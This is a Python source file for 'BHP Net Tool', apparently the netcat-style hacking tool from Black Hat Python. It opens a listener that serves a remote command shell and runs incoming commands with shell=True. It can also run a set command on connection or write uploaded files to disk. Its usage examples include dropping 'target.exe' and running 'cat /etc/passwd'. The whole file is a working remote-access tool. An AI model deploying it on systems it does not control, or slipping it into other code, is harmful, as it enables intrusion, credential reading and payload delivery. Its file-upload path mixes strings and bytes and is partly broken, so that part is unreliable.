import sys
import socket
import getopt
import threading
import subprocess

listen = False
command = False
upload = False
execute = ''
target = ''
upload_destination = ''
port = 0

def usage():
    print('BHP Net Tool')
    print
    print('Usage: bhnet.py -t target_host -p port')
    print('-l --listen              - listen on [host]:[port] for')
    print('                         incoming connections')
    print('-e --execute=file_to_run - execute the given file upon')
    print('                         receiving a connection')
    print('-c --command             - initialize a command shell')
    print('-u --upload=destination  - upon receiving connection upload a')
    print('                         file and write to [destination]')
    print
    print
    print(' Examples:')
    print('bhnet.py -t 192.168.0.1 -p 5555 -l -c')
    print('bhnet.py -t 192.168.0.1 -p 5555 -l -u c:\\target.exe')
    print('bhnet.py -t 192.168.0.1 -p 5555 -l -e "cat /etc/passwd"')
    print('echo "ABCDEFGHI" | ./bnet.py -t 192.168.1.12 -p 135')
    sys.exit(0)

def str_to_byte(value):
    return value.encode('utf-8')

def byte_to_str(value):
    return value.decode('utf-8')

def client_sender():

    print('started client sender')

    # if you not send any data, input just Enter without any data.
    buffer = ''
    while True:
       line = sys.stdin.readline()
       if line == '\n':
           break
       buffer+=line

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target, port))

    if len(buffer):
        client.send(str_to_byte(buffer))

    print('sent the input')

    while True:
        recv_len = 1
        response = b''

        while recv_len:
            data = client.recv(4096)
            recv_len = len(data)
            print('recieved %d length' % recv_len)
            response+= data

            if recv_len < 4096:
                 break

        print('recieved the total of %d data' % len(response))
        print(byte_to_str(response))

        buffer = input('')
        buffer+= '\n'

        client.send(str_to_byte(buffer))
        print('sent the input')

def server_loop():
    global target

    if not len(target):
        target = '0.0.0.0'

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    server.bind((target, port))

    server.listen(5)
    print('start listening')

    while True:
        client_socket, addr = server.accept()
        print('accept connect')

        client_thread = threading.Thread(
                target=client_handler, args=(client_socket,))
        client_thread.start()


def run_command(command):
    command = command.rstrip()

    output = subprocess.check_output(
            command.decode('utf-8'), stderr=subprocess.STDOUT, shell=True)

    return output

def client_handler(client_socket):
    global upload
    global execute
    global command

    print('start handler')

    if len(upload_destination):

        file_buffer = ''

        while True:
            data = client_socket.recv(1024)

            if len(data) == 0:
                break
            else:
                file_buffer += data

        try:
            file_descriptor = open(upload_destination, 'wb')
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            client_socket.send(
                    "Successfully saved file to %s\r\n" % upload_destination)

        except:
            client_socket.send(
                    "Failed to save file to %s\r\n" % upload_destination)

    if len(execute):
        output = run_command(execute)
        client_socket.send(output)

    if command:
        prompt = b'<BHP:#> '
        client_socket.send(prompt)

        while True:
            cmd_buffer = b''
            while b'\n' not in cmd_buffer:
                cmd_buffer+= client_socket.recv(1024)

            response = run_command(cmd_buffer)
            response+= prompt

            client_socket.send(response)

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    try:
        opts, args = getopt.getopt(
                sys.argv[1:],
                'hle:t:p:cu:',
                ['help', 'listen', 'execute=', 'target=',
                 'port=', 'command', 'upload='])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o, a in opts:
        if o in ('-h', '--help'):
            usage()
        elif o in ('-l', '--listen'):
            listen = True
        elif o in ('-e', '--execute'):
            execute = a
        elif o in ('-c', '--commandshell'):
            command = True
        elif o in ('-u', '--upload'):
            upload_destination = a
        elif o in ('-t', '--target'):
            target = a
        elif o in ('-p', '--port'):
            port = int(a)
        else:
            assert False, 'Unhandled Option'

    if not listen and len(target) and port > 0:
        client_sender()

    if listen:
        server_loop()

main()

